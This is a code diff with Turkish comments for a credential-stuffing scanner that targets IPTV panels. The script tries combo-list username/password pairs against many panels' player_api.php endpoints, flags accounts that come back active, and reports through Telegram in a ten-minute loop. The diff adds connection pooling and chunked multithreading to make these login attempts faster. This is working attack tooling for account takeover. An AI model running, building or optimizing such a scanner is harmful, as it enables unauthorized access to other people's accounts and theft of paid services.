@@ -2,6 +2,7 @@ import os
 import time
 import datetime
 import requests
+from requests.adapters import HTTPAdapter
 from requests.packages.urllib3.exceptions import InsecureRequestWarning
 from concurrent.futures import ThreadPoolExecutor, as_completed
 
@@ -37,11 +38,16 @@ HEADERd = {
 
 BASE_DIR = os.path.dirname(os.path.abspath(__file__))
 
-# Her thread için ayrı bir Session kullanarak soket tıkanıklığını önleyelim
-def m3u_tara_detayli(session, panel, user, pas):
+# Global optimize edilmiş session ve adaptör
+session = requests.Session()
+adapter = HTTPAdapter(pool_connections=50, pool_maxsize=50, max_retries=1)
+session.mount('http://', adapter)
+session.mount('https://', adapter)
+
+def m3u_tara_detayli(panel, user, pas):
     api_url = f"http://{panel}/player_api.php?username={user}&password={pas}"
     try:
-        res = session.get(api_url, headers=HEADERd, timeout=4, verify=False)
+        res = session.get(api_url, headers=HEADERd, timeout=(3, 5), verify=False)
         if res.status_code == 200 and 'user_info' in res.text:
             veri = str(res.text)
             if '"auth":1' in veri or '"status":"Active"' in veri:
@@ -114,7 +120,7 @@ def m3u_tara_detayli(session, panel, user, pas):
 def arka_plan_tarayici():
     print("[*] Bulut Otonom Hızlı Tarayıcı Başlatıldı...")
     time.sleep(2)
-    telegrama_gonder("🚀 <b>Hızlı Multi-Thread Tarayıcı Aktif!</b>\n⚡ Oturum yönetimi optimize edildi.")
+    telegrama_gonder("🚀 <b>Hızlı Multi-Thread Tarayıcı Aktif!</b>\n⚡ Bellek ve Bağlantı Havuzu Optimizasyonu Devrede.")
     
     combo_dir = os.path.join(BASE_DIR, 'combo')
     panel_dir = os.path.join(BASE_DIR, 'panel_list')
@@ -152,18 +158,24 @@ def arka_plan_tarayici():
                                     if user and pas:
                                         combolar.append((user, pas))
 
-                        print(f"[i] Toplam {len(combolar)} hesap, {len(paneller)} panel ile taranıyor...")
+                        print(f"[i] Toplam {len(combolar)} hesap, {len(paneller)} panel ile taranıyor (Parçalı Mod)...")
                         
-                        # Thread havuzu ve paylaşımlı Session havuzu
-                        with ThreadPoolExecutor(max_workers=20) as executor:
-                            with requests.Session() as session:
+                        # Listeyi parçalara (chunk) bölerek işleyelim (Örn: Her seferinde 1000 hesap)
+                        chunk_size = 1000
+                        for i in range(0, len(combolar), chunk_size):
+                            chunk = combolar[i:i + chunk_size]
+                            
+                            with ThreadPoolExecutor(max_workers=20) as executor:
                                 futures = [
-                                    executor.submit(m3u_tara_detayli, session, panel, user, pas)
-                                    for user, pas in combolar
+                                    executor.submit(m3u_tara_detayli, panel, user, pas)
+                                    for user, pas in chunk
                                     for panel in paneller
                                 ]
                                 for future in as_completed(futures):
                                     pass
+                            
+                            # Her chunk sonrasında kısa bir nefes aldırıp RAM ve soketleri rahatlatalım
+                            time.sleep(0.5)
         
             print("[i] Tarama turu tamamlandı, 10 dakika sonra tekrar dönecek...")
             time.sleep(600)
